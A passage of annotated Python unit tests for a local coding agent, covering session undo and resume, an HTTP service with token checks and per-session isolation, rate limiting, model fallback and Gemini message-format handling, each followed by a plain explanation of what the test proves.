130 |                 {"id": "c1", "function": {"name": "f", "arguments": {"a": 1}}}]},
131 |             {"role": "tool", "tool_name": "f", "tool_call_id": "c1", "content": "ok"}])
132 |         self.assertEqual(converted[0]["tool_calls"][0]["function"]["arguments"], '{"a": 1}')
133 |         self.assertEqual(converted[1]["tool_call_id"], "c1")
134 | 
135 | 
```
```python
165 | class BackendRegistryTests(unittest.TestCase):
```
```python
166 |     def test_known_and_unknown(self):
167 |         self.assertIsInstance(make_backend(Config()), OllamaClient)
168 |         self.assertIsInstance(make_backend(replace(Config(), backend="openai")), OpenAICompatClient)
169 |         with self.assertRaisesRegex(ValueError, "unknown backend"):
170 |             make_backend(replace(Config(), backend="nope"))
171 | 
172 | 
```
- Tool calls and usage numbers parse correctly and the bearer token is sent. Conversion turns dict arguments into JSON
  text and keeps the tool-call id link. The registry builds the right class per name and rejects unknown names.

## Context, undo, sessions
```python
173 | class ContextTests(unittest.TestCase):
```
```python
174 |     def test_prompt_contains_tree_and_notes(self):
175 |         with tempfile.TemporaryDirectory() as tmp:
176 |             root = Path(tmp)
177 |             (root / "a.py").write_text("x = 1\n", encoding="utf-8")
178 |             (root / "AGENT.md").write_text("Use tabs never.", encoding="utf-8")
179 |             (root / "__pycache__").mkdir()
180 |             prompt = build_system_prompt(replace(Config(), workspace=root))
181 |             self.assertIn("a.py", prompt)
182 |             self.assertIn("Use tabs never.", prompt)
183 |             self.assertNotIn("__pycache__", prompt)
184 | 
```
```python
185 |     def test_tree_is_capped(self):
186 |         with tempfile.TemporaryDirectory() as tmp:
187 |             for n in range(10):
188 |                 (Path(tmp) / f"f{n}.txt").write_text("x", encoding="utf-8")
189 |             prompt = build_system_prompt(replace(Config(), workspace=Path(tmp), tree_entries=3))
190 |             self.assertIn("...", prompt)
191 |             self.assertNotIn("f9.txt", prompt)
192 | 
193 | 
```
- The system prompt includes files and `AGENT.md` text but not `__pycache__`; the tree is capped with `...`.

```python
194 | class CheckpointTests(unittest.TestCase):
```
```python
195 |     def test_undo_restores_deletes_and_recreates(self):
196 |         with tempfile.TemporaryDirectory() as tmp:
197 |             root = Path(tmp)
198 |             (root / "keep.txt").write_text("v1", encoding="utf-8")
199 |             (root / "gone.txt").write_text("bye", encoding="utf-8")
200 |             points = Checkpoints(root)
201 |             points.take()
202 |             (root / "keep.txt").write_text("v2", encoding="utf-8")   # modified
203 |             (root / "gone.txt").unlink()                              # deleted
204 |             (root / "new.txt").write_text("n", encoding="utf-8")      # created
205 |             message = points.undo()
206 |             self.assertEqual((root / "keep.txt").read_text(encoding="utf-8"), "v1")
207 |             self.assertEqual((root / "gone.txt").read_text(encoding="utf-8"), "bye")
208 |             self.assertFalse((root / "new.txt").exists())
209 |             self.assertIn("restored 2", message)
210 |             self.assertEqual(points.undo(), "nothing to undo")
211 | 
212 | 
```
- After modifying one file, deleting another and creating a third, `undo` restores the first two, removes the third,
  reports 2 restored, and a second `undo` says nothing to undo.

```python
213 | class SessionTests(unittest.TestCase):
```
```python
214 |     def test_log_and_resume(self):
215 |         with tempfile.TemporaryDirectory() as tmp:
216 |             cfg = replace(Config(), workspace=Path(tmp) / "ws")
217 |             log = SessionLog(Path(tmp) / "sessions")
218 |             agent = Agent(cfg, FakeBackend([{"role": "assistant", "content": "hi there"}]),
219 |                           ToolBox(cfg), Meter(), log)
220 |             agent.run("hello")
221 |             saved = load_session(latest_session(Path(tmp) / "sessions"))
222 |             self.assertEqual([m["role"] for m in saved], ["user", "assistant"])
223 |             fresh = Agent(cfg, FakeBackend([]), ToolBox(cfg), Meter())
224 |             fresh.restore(saved)
225 |             self.assertEqual(fresh.messages[-1]["content"], "hi there")
226 |             self.assertEqual(fresh.messages[0]["role"], "system")
227 | 
```
```python
228 |     def test_latest_of_empty_folder(self):
229 |         with tempfile.TemporaryDirectory() as tmp:
230 |             self.assertIsNone(latest_session(Path(tmp)))
231 | 
232 | 
```
- A run is logged as user + assistant messages; a fresh agent restores them and still starts with a system message. An
  empty folder has no latest session.

## Search, workspace check, ids
```python
233 | class SearchAndWorkspaceTests(unittest.TestCase):
```
```python
234 |     def test_search_finds_lines_and_reports_bad_regex(self):
235 |         with tempfile.TemporaryDirectory() as tmp:
236 |             box = ToolBox(replace(Config(), workspace=Path(tmp)), lambda _a: True)
237 |             box.call("write_file", {"path": "a.py", "content": "def hello():\n    return 1\n"})
238 |             self.assertIn("a.py:1: def hello():", box.call("search", {"pattern": "def \\w+"}))
239 |             self.assertEqual(box.call("search", {"pattern": "zzz"}), "no matches")
240 |             self.assertIn("invalid regular expression", box.call("search", {"pattern": "("}))
241 | 
```
```python
242 |     def test_check_workspace_lists_broken_files(self):
243 |         with tempfile.TemporaryDirectory() as tmp:
244 |             box = ToolBox(replace(Config(), workspace=Path(tmp)))
245 |             (Path(tmp) / "ok.py").write_text("x = 1\n", encoding="utf-8")
246 |             (Path(tmp) / "bad.py").write_text("def f(:\n", encoding="utf-8")
247 |             problems = box.check_workspace()
248 |             self.assertEqual(len(problems), 1)
249 |             self.assertIn("bad.py", problems[0])
250 | 
```
```python
251 |     def test_agent_assigns_tool_call_ids(self):
252 |         with tempfile.TemporaryDirectory() as tmp:
253 |             cfg = replace(Config(), workspace=Path(tmp))
254 |             script = [tool_call("list_files"), {"role": "assistant", "content": "done"}]
255 |             agent = Agent(cfg, FakeBackend(script), ToolBox(cfg), Meter())
256 |             agent.run("ls")
257 |             tool_message = next(m for m in agent.messages if m["role"] == "tool")
258 |             self.assertTrue(tool_message["tool_call_id"].startswith("call_"))
259 | 
260 | 
```
- `search` finds `file:line: text`, reports "no matches", and reports a bad regex politely. `check_workspace` returns
  exactly the broken file. The agent gives every tool call an id starting with `call_`.

## Eval harness
```python
261 | class EvalHarnessTests(unittest.TestCase):
```
```python
262 |     def test_passing_run_is_scored_pass(self):
263 |         script = [tool_call("write_file", path="fizzbuzz.py", content=FIZZ_CODE),
264 |                   {"role": "assistant", "content": "done"}]
265 |         result = run_task(FIZZBUZZ, Config(), FakeBackend(script))
266 |         self.assertTrue(result.passed)
267 |         self.assertEqual(result.calls, 2)
268 | 
```
```python
269 |     def test_do_nothing_run_is_scored_fail(self):
270 |         idk = {"role": "assistant", "content": "idk"}
271 |         result = run_task(FIZZBUZZ, Config(), FakeBackend([idk, idk]))   # 2nd reply answers the nudge
272 |         self.assertFalse(result.passed)
273 |         self.assertEqual(result.calls, 2)
274 | 
275 | 
```
- A scripted "model" that writes correct fizzbuzz is scored PASS (2 calls); one that does nothing is scored FAIL —
  proving the scoreboard can tell good runs from bad ones. The do-nothing model is asked twice (2 calls) because the
  first useless answer to a "Create ..." request triggers the nudge; the second one still changes nothing.

```python
276 | if __name__ == "__main__":
277 |     unittest.main()
```
- Lets you run the file directly.

---
# `tests/test_server.py` — the HTTP service

**Role:** proves the API, the token check and the per-session isolation using a real local socket (port 0 = any free
port) and a scripted fake model, so no model server is needed.

## Helpers
```python
  1 | """Tests for the HTTP service mode, using a real local socket and a scripted fake model."""
  2 | import json
  3 | import tempfile
  4 | import threading
  5 | import unittest
  6 | import urllib.error
  7 | import urllib.request
  8 | from dataclasses import replace
  9 | from pathlib import Path
 10 | 
 11 | from localagent.config import Config
 12 | from localagent.server import SessionManager, build_server
 13 | 
 14 | from .test_agent import FakeBackend, tool_call
 15 | 
 16 | 
```
- Imports the standard-library HTTP client, the server pieces, and the fake model helpers from `test_agent.py`.

```python
 17 | def call(base: str, method: str, path: str, body: dict | None = None, token: str = ""):
 18 |     """Send one request; return (status, parsed JSON) even for HTTP error codes."""
 19 |     data = None if body is None else json.dumps(body).encode("utf-8")
 20 |     request = urllib.request.Request(base + path, data=data, method=method)
 21 |     if token:
 22 |         request.add_header("Authorization", f"Bearer {token}")
 23 |     try:
 24 |         with urllib.request.urlopen(request, timeout=20) as reply:
 25 |             return reply.status, json.loads(reply.read())
 26 |     except urllib.error.HTTPError as exc:
 27 |         with exc:
 28 |             return exc.code, json.loads(exc.read())
 29 | 
 30 | 
```
- Sends one request (optionally with a JSON body and bearer token) and returns `(status, parsed JSON)`. HTTP error codes
  are returned instead of raised so tests can assert on 401/404/400.

## Tests
```python
 31 | class ServerTests(unittest.TestCase):
```
```python
 32 |     def start(self, script, token="secret"):
 33 |         tmp = tempfile.TemporaryDirectory()
 34 |         self.addCleanup(tmp.cleanup)
 35 |         manager = SessionManager(replace(Config(), auto_approve=True), Path(tmp.name),
 36 |                                  backend_factory=lambda _cfg: FakeBackend(script))
 37 |         server = build_server(manager, "127.0.0.1", 0, token)
 38 |         threading.Thread(target=server.serve_forever, daemon=True).start()
 39 |         self.addCleanup(server.server_close)
 40 |         self.addCleanup(server.shutdown)
 41 |         return f"http://127.0.0.1:{server.server_port}"
 42 | 
```
- `start` builds a manager whose backend factory always returns the same scripted fake, launches the server on a daemon
  thread, registers cleanup, and returns its base URL. A temp folder holds the session workspaces.

```python
 43 |     def test_health_needs_no_token(self):
 44 |         base = self.start([])
 45 |         self.assertEqual(call(base, "GET", "/health"), (200, {"status": "ok"}))
 46 | 
```
```python
 47 |     def test_requests_without_token_are_rejected(self):
 48 |         base = self.start([])
 49 |         self.assertEqual(call(base, "POST", "/sessions")[0], 401)
 50 |         self.assertEqual(call(base, "GET", "/sessions/x/files")[0], 401)
 51 |         self.assertEqual(call(base, "POST", "/sessions", token="wrong")[0], 401)
 52 | 
```
- `/health` works without a token; creating a session or listing files without a token, or with a wrong one, gives 401.

```python
 53 |     def test_full_conversation_creates_files(self):
 54 |         script = [tool_call("write_file", path="hello.txt", content="hi"),
 55 |                   {"role": "assistant", "content": "created"}]
 56 |         base = self.start(script)
 57 |         status, created = call(base, "POST", "/sessions", token="secret")
 58 |         self.assertEqual(status, 201)
 59 |         path = f"/sessions/{created['id']}"
 60 |         status, reply = call(base, "POST", path + "/messages", {"text": "Create hello.txt"}, "secret")
 61 |         self.assertEqual((status, reply["answer"], reply["calls"]), (200, "created", 2))
 62 |         self.assertTrue(any("write_file" in e for e in reply["events"]))
 63 |         self.assertEqual(call(base, "GET", path + "/files", token="secret")[1], {"files": ["hello.txt"]})
 64 | 
```
- Create a session (201), send "Create hello.txt" (the fake model writes the file, then answers "created"): the reply
  has the answer, 2 model calls and a `write_file` event, and the files endpoint lists `hello.txt`.

```python
 65 |     def test_bad_requests(self):
 66 |         base = self.start([])
 67 |         _, created = call(base, "POST", "/sessions", token="secret")
 68 |         path = f"/sessions/{created['id']}/messages"
 69 |         self.assertEqual(call(base, "POST", path, {"text": "  "}, "secret")[0], 400)
 70 |         self.assertEqual(call(base, "POST", path, {"nope": 1}, "secret")[0], 400)
 71 |         self.assertEqual(call(base, "POST", "/sessions/unknown/messages", {"text": "x"}, "secret")[0], 404)
 72 |         self.assertEqual(call(base, "GET", "/sessions/unknown/files", token="secret")[0], 404)
 73 |         self.assertEqual(call(base, "GET", "/elsewhere", token="secret")[0], 404)
 74 |         self.assertEqual(call(base, "POST", "/elsewhere", token="secret")[0], 404)
 75 | 
```
- Blank text and a missing `text` field → 400; unknown session ids → 404 for both messages and files; unknown paths → 404
  for GET and POST.

```python
 76 |     def test_sessions_have_separate_workspaces(self):
 77 |         script = [tool_call("write_file", path="only_a.txt", content="x"),
 78 |                   {"role": "assistant", "content": "ok"}]
 79 |         base = self.start(script, token="")
 80 |         _, a = call(base, "POST", "/sessions")
 81 |         _, b = call(base, "POST", "/sessions")
 82 |         call(base, "POST", f"/sessions/{a['id']}/messages", {"text": "Create only_a.txt"})
 83 |         self.assertEqual(call(base, "GET", f"/sessions/{a['id']}/files")[1], {"files": ["only_a.txt"]})
 84 |         self.assertEqual(call(base, "GET", f"/sessions/{b['id']}/files")[1], {"files": []})
 85 | 
 86 | 
```
- With no token configured, two sessions are created and only the first receives a file; the second session's file list is
  empty - isolation works.

```python
 87 | class SessionLimitTests(unittest.TestCase):
```
```python
 88 |     def manager(self, clock, **kw):
 89 |         tmp = tempfile.TemporaryDirectory()
 90 |         self.addCleanup(tmp.cleanup)
 91 |         return SessionManager(Config(), Path(tmp.name), backend_factory=lambda _c: FakeBackend([]),
 92 |                               clock=clock, **kw)
 93 | 
```
```python
 94 |     def test_idle_sessions_expire_and_activity_keeps_them(self):
 95 |         now = [0.0]
 96 |         manager = self.manager(lambda: now[0], ttl=100.0)
 97 |         kept, dropped = manager.create(), manager.create()
 98 |         now[0] = 80.0
 99 |         self.assertIsNotNone(manager.get(kept))        # touching it renews its lifetime
100 |         now[0] = 150.0
101 |         self.assertIsNotNone(manager.get(kept))        # 70 s since last use: alive
102 |         self.assertIsNone(manager.get(dropped))        # 150 s idle: expired
103 | 
```
```python
104 |     def test_close_all_closes_every_session(self):
105 |         manager = self.manager(lambda: 0.0)
106 |         ids = [manager.create(), manager.create()]
107 |         sessions = [manager.get(i) for i in ids]
108 |         closed: list[str] = []
109 |         for session_id, session in zip(ids, sessions, strict=True):
110 |             assert session is not None
111 |             session.toolbox.close = lambda sid=session_id: closed.append(sid)   # type: ignore
112 |         manager.close_all()
113 |         self.assertEqual(sorted(closed), sorted(ids))   # each sandbox would be stopped
114 |         self.assertIsNone(manager.get(ids[0]))         # and the sessions are gone
115 | 
```
```python
116 |     def test_session_limit_returns_429_and_frees_after_expiry(self):
117 |         now = [0.0]
118 |         tmp = tempfile.TemporaryDirectory()
119 |         self.addCleanup(tmp.cleanup)
120 |         manager = SessionManager(Config(), Path(tmp.name), backend_factory=lambda _c: FakeBackend([]),
121 |                                  max_sessions=1, ttl=10.0, clock=lambda: now[0])
122 |         server = build_server(manager, "127.0.0.1", 0, "")
123 |         threading.Thread(target=server.serve_forever, daemon=True).start()
124 |         self.addCleanup(server.server_close)
125 |         self.addCleanup(server.shutdown)
126 |         base = f"http://127.0.0.1:{server.server_port}"
127 |         self.assertEqual(call(base, "POST", "/sessions")[0], 201)
128 |         self.assertEqual(call(base, "POST", "/sessions")[0], 429)
129 |         now[0] = 11.0                                  # the first session is now idle too long
130 |         self.assertEqual(call(base, "POST", "/sessions")[0], 201)
131 | 
132 | 
```
- `manager` builds a `SessionManager` with a fake model and a clock the test controls (a one-item list).
- **Expiry:** two sessions with a 100 s TTL; at t=80 one is touched (renewing it); at t=150 the touched one is still alive
  (70 s idle) and the untouched one is gone (150 s idle).
- **Shutdown:** `close_all` closes both sessions' toolboxes (recorded by replacing `close` with a function that notes
  the session id; the `sid=session_id` default fixes each id at definition time) and forgets the sessions.
- **Limit:** with `max_sessions=1` over real HTTP, the second `POST /sessions` returns 429; after the clock passes the TTL
  the first session has expired, so creating a session succeeds again (201).

```python
133 | if __name__ == "__main__":
134 |     unittest.main()
```
- Lets you run the file directly.

---
# `tests/test_phase4.py` — Gemini limits, retries, fallback, and the Docker sandbox

**Role:** proves the hosted-model safety net and the sandbox without spending real quota: a fake clock replaces real
waiting, scripted fake models replace Gemini, and the local fake HTTP server checks the exact wire format. Only the
last test uses real Docker, and it is skipped automatically when Docker is not running.

## Helpers
```python
  1 | """Tests for Gemini support (rate limits, retries, fallback) and the Docker sandbox."""
  2 | import json
  3 | import tempfile
  4 | import unittest
  5 | from dataclasses import replace
  6 | from pathlib import Path
  7 | from unittest import mock
  8 | 
  9 | from localagent.backends import make_backend, model_limits
 10 | from localagent.cli import model_label
 11 | from localagent.config import Config
 12 | from localagent.doctor import run_doctor
 13 | from localagent.llm import LLMError, Reply
 14 | from localagent.openai_compat import OpenAICompatClient, to_openai
 15 | from localagent.ratelimit import QuotaExhausted, RateLimiter, pacific_day
 16 | from localagent.resilient import Entry, FallbackBackend, estimate_tokens, server_delay
 17 | from localagent.runners import DockerRunner, LocalRunner, docker_available, sandbox_image_ready
 18 | from localagent.tools import ToolBox
 19 | 
 20 | from .test_phase2 import FakeServer
 21 | 
 22 | 
```
- Imports the modules under test and `FakeServer` from `test_phase2.py`.

```python
 23 | class FakeClock:
 24 |     """A clock the test moves by hand; sleeping just advances it."""
 25 | 
```
```python
 26 |     def __init__(self, start: float = 1_700_000_000.0) -> None:
 27 |         self.now = start
 28 |         self.slept: list[float] = []
 29 | 
```
```python
 30 |     def __call__(self) -> float:
 31 |         return self.now
 32 | 
```
```python
 33 |     def sleep(self, seconds: float) -> None:
 34 |         self.slept.append(seconds)
 35 |         self.now += seconds
 36 | 
 37 | 
```
- A clock that only moves when told. Calling it returns the current fake time; `sleep(s)` records `s` and moves time
  forward by `s`, so a 60-second rate-limit wait finishes instantly but is still measured.

## Rate limiter
```python
 38 | class RateLimiterTests(unittest.TestCase):
```
```python
 39 |     def test_requests_per_minute_wait(self):
 40 |         clock = FakeClock()
 41 |         limiter = RateLimiter("m", rpm=2, tpm=10_000, rpd=100, clock=clock, sleep=clock.sleep)
 42 |         for _ in range(3):
 43 |             limiter.before_call(10)
 44 |         self.assertEqual(len(clock.slept), 1)                # third call had to wait
 45 |         self.assertAlmostEqual(sum(clock.slept), 60.0)
 46 | 
```
```python
 47 |     def test_tokens_per_minute_wait_and_too_big_request(self):
 48 |         clock = FakeClock()
 49 |         limiter = RateLimiter("m", rpm=100, tpm=1000, rpd=100, clock=clock, sleep=clock.sleep)
 50 |         limiter.before_call(600)
 51 |         limiter.after_call(600)
 52 |         limiter.before_call(600)                             # 600 + 600 > 1000: waits
 53 |         self.assertTrue(clock.slept)
 54 |         with self.assertRaises(LLMError):
 55 |             limiter.before_call(5000)                        # can never fit in one minute
 56 | 
```
```python
 57 |     def test_daily_quota_persists_and_resets_next_day(self):
 58 |         with tempfile.TemporaryDirectory() as tmp:
 59 |             usage = Path(tmp) / "usage.json"
 60 |             clock = FakeClock()
 61 |             first = RateLimiter("m", rpm=100, tpm=10_000, rpd=2, usage_file=usage, clock=clock)
 62 |             first.before_call(1)
 63 |             first.after_call(7)
 64 |             first.before_call(1)
 65 |             again = RateLimiter("m", rpm=100, tpm=10_000, rpd=2, usage_file=usage, clock=clock)
 66 |             self.assertTrue(again.exhausted())               # counted on disk, survives restart
 67 |             with self.assertRaises(QuotaExhausted):
 68 |                 again.before_call(1)
 69 |             self.assertIn("2/2 requests, 7 tokens", again.status())
 70 |             other = RateLimiter("x", rpm=100, tpm=10_000, rpd=2, usage_file=usage, clock=clock)
 71 |             self.assertIn("0/2 requests", other.status())    # each model has its own counter
 72 |             clock.now += 86_400                              # next day
 73 |             self.assertFalse(again.exhausted())
 74 | 
```
```python
 75 |     def test_mark_exhausted_and_pacific_day(self):
 76 |         limiter = RateLimiter("m", rpm=10, tpm=10_000, rpd=5)
 77 |         limiter.mark_exhausted()
 78 |         self.assertTrue(limiter.exhausted())
 79 |         self.assertEqual(pacific_day(0.0), "1969-12-31")     # midnight UTC is 4 pm in California
 80 | 
 81 | 
```
- With 2 requests/minute, the third request waits exactly 60 s.
- With 1000 tokens/minute, two 600-token requests cannot share a minute (the second waits); a 5000-token request is
  refused outright.
- Daily quota of 2: after two requests a *new* limiter reading the same file is exhausted (the count survived a
  "restart") and refuses with `QuotaExhausted`; the status line shows requests and tokens; another model has its own
  counter; one day later the quota is free again.
- `mark_exhausted` works, and timestamp 0 (midnight UTC, 1 Jan 1970) is still 31 Dec 1969 in California.

## Fallback chain
```python
 82 | class ScriptedBackend:
 83 |     """Returns or raises the given items in order, one per chat() call."""
 84 | 
```
```python
 85 |     def __init__(self, items):
 86 |         self.items = list(items)
 87 |         self.calls = 0
 88 | 
```
```python
 89 |     def chat(self, messages, tools, on_token=None):
 90 |         self.calls += 1
 91 |         item = self.items.pop(0)
 92 |         if isinstance(item, Exception):
 93 |             raise item
 94 |         return item
 95 | 
 96 | 
```
```python
 97 | def reply(text: str) -> Reply:
 98 |     return Reply({"role": "assistant", "content": text}, 10, 5, 0.1)
 99 | 
100 | 
```
- `ScriptedBackend` returns or raises prepared items in order and counts calls; `reply` makes a simple answer worth
  10 + 5 tokens.

```python
101 | class FallbackTests(unittest.TestCase):
```
```python
102 |     def run_chain(self, *entries, retries=2):
103 |         slept: list[float] = []
104 |         backend = FallbackBackend(list(entries), retries, sleep=slept.append)
105 |         return backend, slept
106 | 
```
```python
107 |     def test_retries_busy_model_then_succeeds(self):
108 |         first = ScriptedBackend([LLMError("busy", 503), reply("hi")])
109 |         backend, slept = self.run_chain(Entry("a", first))
110 |         self.assertEqual(backend.chat([], []).message["content"], "hi")
111 |         self.assertEqual((first.calls, slept, backend.last_model), (2, [2.0], "a"))
112 | 
```
```python
113 |     def test_server_retry_delay_is_respected(self):
114 |         error = LLMError('HTTP 429: {"retryDelay": "17s"}', 429)
115 |         self.assertEqual(server_delay(error), 17.0)
116 |         first = ScriptedBackend([error, reply("ok")])
117 |         backend, slept = self.run_chain(Entry("a", first))
118 |         backend.chat([], [])
119 |         self.assertEqual(slept, [18.0])
120 | 
```
```python
121 |     def test_falls_back_after_retries_and_on_daily_quota(self):
122 |         busy = ScriptedBackend([LLMError("x", 503)] * 3)
123 |         daily = ScriptedBackend([LLMError("429 quota: GenerateRequestsPerDay exceeded", 429)])
124 |         limiter = RateLimiter("b", rpm=100, tpm=10_000, rpd=10)
125 |         local = ScriptedBackend([reply("local")])
126 |         backend, _ = self.run_chain(Entry("a", busy), Entry("b", daily, limiter), Entry("c", local))
127 |         self.assertEqual(backend.chat([], []).message["content"], "local")
128 |         self.assertEqual(busy.calls, 3)                      # 1 try + 2 retries
129 |         self.assertTrue(limiter.exhausted())                 # server said "per day"
130 |         self.assertEqual(backend.last_model, "c")
131 | 
```
```python
132 |     def test_exhausted_model_is_skipped_without_a_call(self):
133 |         limiter = RateLimiter("a", rpm=100, tpm=10_000, rpd=1)
134 |         limiter.mark_exhausted()
135 |         skipped = ScriptedBackend([])
136 |         backend, _ = self.run_chain(Entry("a", skipped, limiter), Entry("b", ScriptedBackend([reply("b")])))
137 |         self.assertEqual(backend.chat([], []).message["content"], "b")
138 |         self.assertEqual(skipped.calls, 0)
139 |         self.assertEqual(len(backend.status()), 1)
140 | 
```
```python
141 |     def test_bad_request_is_not_hidden_and_all_failing_explains(self):
142 |         backend, _ = self.run_chain(Entry("a", ScriptedBackend([LLMError("bad", 400)])))
143 |         with self.assertRaises(LLMError) as caught:
144 |             backend.chat([], [])
145 |         self.assertEqual(caught.exception.status, 400)
146 |         down = ScriptedBackend([LLMError("no network")] * 3)
147 |         backend, _ = self.run_chain(Entry("a", down))
148 |         with self.assertRaisesRegex(LLMError, "every model failed"):
149 |             backend.chat([], [])
150 |         with self.assertRaises(ValueError):
151 |             FallbackBackend([])
152 | 
```
```python
153 |     def test_server_daily_limit_is_learned_and_announced(self):
154 |         notices: list[str] = []
155 |         error = LLMError('HTTP 429: {"quotaId": "GenerateRequestsPerDayPerProjectPerModel-FreeTier", '
156 |                          '"quotaValue": "20"}', 429)
157 |         limiter = RateLimiter("a", rpm=100, tpm=10_000, rpd=1500)
158 |         backend = FallbackBackend([Entry("a", ScriptedBackend([error]), limiter),
159 |                                    Entry("b", ScriptedBackend([reply("b")]))],
160 |                                   sleep=lambda _s: None, on_notice=notices.append)
161 |         backend.chat([], [])
162 |         self.assertTrue(limiter.exhausted())
163 |         self.assertIn("1/20 requests", limiter.status())          # the real limit, not 1500
164 |         self.assertIn("used up", limiter.status())
165 |         self.assertTrue(any("Google's limit: 20/day" in n for n in notices))
166 | 
```
```python
167 |     def test_per_model_limit_overrides(self):
168 |         config = replace(Config(), gemini_limits=("m1=5/20", "m2 = 7/30"))
169 |         self.assertEqual(model_limits(config, "m1"), (5, 20))
170 |         self.assertEqual(model_limits(config, "m2"), (7, 30))
171 |         self.assertEqual(model_limits(config, "other"), (config.rpm, config.rpd))
172 |         with self.assertRaisesRegex(ValueError, "model=rpm/rpd"):
173 |             model_limits(replace(config, gemini_limits=("m1=fast",)), "m1")
174 | 
```
```python
175 |     def test_limiter_counts_tokens_of_successful_calls(self):
176 |         limiter = RateLimiter("a", rpm=100, tpm=10_000, rpd=10)
177 |         backend, _ = self.run_chain(Entry("a", ScriptedBackend([reply("x")]), limiter))
178 |         backend.chat([{"role": "user", "content": "hello"}], [])
179 |         self.assertIn("1/10 requests, 15 tokens", limiter.status())
180 |         self.assertGreater(estimate_tokens([{"content": "x" * 400}], []), 90)
181 | 
182 | 
```
- `run_chain` builds a chain whose sleeps are recorded instead of performed.
- A 503 then success: 2 calls, one 2-second pause, `last_model` set.
- A 429 saying `retryDelay: 17s` waits 18 s (17 + 1 safety second).
- Chain of three: the first model stays busy (1 try + 2 retries = 3 calls), the second reports a *per-day* 429 (its
  limiter becomes exhausted), the third (the "local" one) answers.
- An exhausted model is skipped with zero calls; `status()` lists the rate-limited model.
- An HTTP 400 is raised immediately (status preserved); when every model fails the error says "every model failed";
  an empty chain is refused.
- A per-day 429 carrying `"quotaValue": "20"` (the exact shape Google sent) marks the model exhausted, its status
  shows `1/20` and "used up", and a notice names Google's limit. Per-model overrides parse with or without spaces,
  unknown models get the defaults, and a malformed entry explains the format.
- A successful call records 15 tokens and 1 request; the size estimate is about 4 characters per token.

## Routing
```python
183 | class RoutingTests(unittest.TestCase):
```
```python
184 |     def test_escalation_puts_strong_models_first_until_reset(self):
185 |         cheap = ScriptedBackend([reply("cheap"), reply("cheap again")])
186 |         strong = ScriptedBackend([reply("strong")])
187 |         backend = FallbackBackend([Entry("cheap", cheap, RateLimiter("c", 100, 10_000, 100))],
188 |                                   strong=[Entry("strong", strong, RateLimiter("s", 100, 10_000, 100))])
189 |         self.assertEqual(backend.chat([], []).message["content"], "cheap")
190 |         self.assertTrue(backend.escalate())
191 |         self.assertFalse(backend.escalate())                 # already escalated
192 |         self.assertEqual(backend.chat([], []).message["content"], "strong")
193 |         backend.reset_route()
194 |         self.assertEqual(backend.chat([], []).message["content"], "cheap again")
195 |         self.assertEqual(len(backend.status()), 2)
196 |         self.assertFalse(FallbackBackend([Entry("x", cheap)]).escalate())   # nothing to escalate to
197 | 
```
```python
198 |     def test_strong_models_are_tried_after_cheap_ones_fail(self):
199 |         limiter = RateLimiter("c", 100, 10_000, 1)
200 |         limiter.mark_exhausted()
201 |         backend = FallbackBackend([Entry("c", ScriptedBackend([]), limiter)],
202 |                                   strong=[Entry("s", ScriptedBackend([reply("s")]))])
203 |         self.assertEqual(backend.chat([], []).message["content"], "s")
204 | 
```
```python
205 |     def test_missing_model_is_skipped_for_good(self):
206 |         gone = ScriptedBackend([LLMError("HTTP 404: model no longer available", 404)])
207 |         other = ScriptedBackend([reply("one"), reply("two")])
208 |         notices: list[str] = []
209 |         backend = FallbackBackend([Entry("gone", gone), Entry("other", other)],
210 |                                   sleep=lambda _s: None, on_notice=notices.append)
211 |         self.assertEqual(backend.chat([], []).message["content"], "one")
212 |         self.assertEqual(backend.chat([], []).message["content"], "two")
213 |         self.assertEqual(gone.calls, 1)                       # never asked again
214 |         self.assertTrue(any("HTTP 404" in n for n in notices))
215 | 
```
```python
216 |     def test_per_minute_limit_is_learned(self):
217 |         limiter = RateLimiter("a", rpm=12, tpm=10_000, rpd=100)
218 |         error = LLMError('HTTP 429: {"quotaId": "GenerateRequestsPerMinutePerProjectPerModel-FreeTier", '
219 |                          '"quotaValue": "5"}', 429)
220 |         backend = FallbackBackend([Entry("a", ScriptedBackend([error, reply("ok")]), limiter)],
221 |                                   sleep=lambda _s: None)
222 |         backend.chat([], [])
223 |         self.assertEqual(limiter._rpm, 5)
224 |         limiter.set_rpm(50)                                  # never raised above what we know
225 |         self.assertEqual(limiter._rpm, 5)
226 | 
227 | 
```
- Cheap answers first; after `escalate()` (which reports `True` once) the strong model answers; after `reset_route()`
  the cheap one again. Status covers both; a chain without reserve cannot escalate.
- When the cheap model is used up, the strong reserve is still tried before giving up.
- A model answering 404 is asked once, announced, and never asked again; the next model answers both requests.
- A per-minute 429 with `quotaValue` 5 lowers the limiter from 12 to 5; a higher value never raises it again.

## Gemini wire format
```python
228 | class GeminiWireTests(unittest.TestCase):
```
```python
229 |     def test_thought_signature_round_trip_reasoning_and_hidden_tokens(self):
230 |         body = {"choices": [{"message": {"content": None, "tool_calls": [{
231 |             "id": "c1", "type": "function",
232 |             "function": {"name": "read_file", "arguments": "{}"},
233 |             "extra_content": {"google": {"thought_signature": "SIG"}}}]}}],
234 |             "usage": {"prompt_tokens": 60, "completion_tokens": 20, "total_tokens": 150}}
235 |         server = FakeServer(200, json.dumps(body).encode())
236 |         try:
237 |             config = replace(Config(), api_base=server.url, reasoning_effort="low", stream=False)
238 |             got = OpenAICompatClient(config).chat([{"role": "user", "content": "hi"}], [])
239 |             self.assertEqual(server.received[0]["reasoning_effort"], "low")
240 |         finally:
241 |             server.close()
242 |         call = got.message["tool_calls"][0]
243 |         self.assertEqual(call["extra_content"]["google"]["thought_signature"], "SIG")
244 |         self.assertEqual((got.prompt_tokens, got.completion_tokens), (60, 90))   # 70 hidden + 20
245 |         history = [{"role": "assistant", "content": "", "tool_calls": [call]}]
246 |         sent = to_openai(history, gemini=True)
247 |         self.assertEqual(sent[0]["tool_calls"][0]["extra_content"], call["extra_content"])
248 |         self.assertNotIn("extra_content", to_openai(history)[0]["tool_calls"][0])   # local: never
249 | 
```
```python
250 |     def test_missing_signatures_get_placeholder_only_for_gemini(self):
251 |         history = [{"role": "assistant", "content": "", "tool_calls": [
252 |             {"id": "c1", "function": {"name": "read_file", "arguments": {}}}]}]
253 |         plain = to_openai(history)[0]["tool_calls"][0]
254 |         self.assertNotIn("extra_content", plain)                  # local servers: unchanged
255 |         filled = to_openai(history, gemini=True)[0]["tool_calls"][0]
256 |         self.assertEqual(filled["extra_content"]["google"]["thought_signature"],
257 |                          "skip_thought_signature_validator")
258 | 
```
```python
259 |     def test_gemini_backend_needs_key_and_labels(self):
260 |         with self.assertRaisesRegex(ValueError, "GEMINI_API_KEY"):
261 |             make_backend(replace(Config(), backend="gemini"))
